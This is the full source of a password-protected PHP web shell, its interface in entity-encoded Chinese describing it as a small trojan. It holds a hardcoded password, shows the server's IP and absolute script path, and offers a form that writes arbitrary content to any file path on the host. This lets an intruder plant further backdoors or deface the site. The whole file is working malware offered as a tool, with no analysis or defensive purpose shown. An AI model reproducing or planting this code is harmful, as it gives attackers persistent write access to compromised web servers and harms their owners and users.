<html>
<head>
<title>&#24403;&#21069;IP <?=$_SERVER['SERVER_NAME']?></title>
</head>
<style>
body{font-family:Georgia;}
#neirong{width:558px;height:250px;border=#0000 1px solid}
#lujing{font-family:Georgia;width:389px;border=#0000 1px solid}
#shc{font-family:Georgia;background:#fff;width:63px;height:20px;border=#0000 1px solid}
</style>
<body bgcolor="black">
<?php
$password="msfacai";/**&#36825;&#37324;&#20462;&#25913;&#23494;&#30721;**/
if ($_GET[pass]==$password){
  if ($_POST)
{
  $fo=fopen($_POST["lujing"],"w");
  if(fwrite($fo,$_POST["neirong"]))
   echo "<font color=red><b>&#25104;&#21151;&#20889;&#20837;&#25991;&#20214;!</b></font>";
  else
   echo "<font color=#33CCFF><b>&#20889;&#20837;&#25991;&#20214;&#22833;&#36133;</b></font>";
  
}
else{
echo "<font color=#CCFFFF>&#20912;&#28304;&#29420;&#31435;&#32534;&#35793;php&#24102;&#23494;&#30721;&#23567;&#39532;</font>";
}
?><br><br>
<font color="#FFFF33">&#26381;&#21153;&#22120;IP&#21450;&#24403;&#21069;&#22495;&#21517;&#65306;<?=$_SERVER['SERVER_NAME']?>(<?=@gethostbyname($_SERVER['SERVER_NAME'])?>)<br>
&#24403;&#21069;&#39029;&#38754;&#30340;&#32477;&#23545;&#36335;&#24452;:<?php echo $_SERVER["SCRIPT_FILENAME"]?>
<form action="" method="post">
&#36755;&#20837;&#25991;&#20214;&#36335;&#24452;:<input type="text" name="lujing" id="lujing" value='<?php echo $_SERVER["SCRIPT_FILENAME"]?>' />
<input type="submit" id="shc" value="&#20889;&#20837;&#25968;&#25454;" /><br />
<textarea name="neirong" id="neirong">
</textarea>
</form></font>
<?php
 }else{
?>
<form action="" method="GET">
<font color="#00FFCC">&#36755;&#20837;&#23494;&#30721;:<input type="password" name="pass" id="pass">


<input type="submit" name="denglu" value="&#24320;&#38376;" /></form>
<?php } ?>